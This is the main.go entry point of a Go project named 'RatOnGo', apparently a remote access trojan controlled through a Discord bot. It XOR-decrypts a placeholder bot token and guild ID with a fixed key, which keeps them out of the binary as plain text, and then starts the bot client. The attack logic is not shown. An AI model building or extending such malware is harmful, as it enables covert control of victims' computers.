package main

import (
	"RatOnGo/internal/bot"
	crypto "RatOnGo/internal/encryptation"
	"context"
)

var key byte = 0x5A

var encryptedToken = []byte{YOUR_ENCRYPTED_TOKEN_HERE}
var encryptedGuildID = []byte{YOUR_ENCRYPTED_GUILDID_HERE}

func main() {
	token := crypto.XORDecrypt(encryptedToken, key)
	guildID := crypto.XORDecrypt(encryptedGuildID, key)

	if token == "" || guildID == "" {
		return
	}

	client, _ := bot.NewClient(token, guildID)

	ctx := context.Background()
	client.Start(ctx)
}
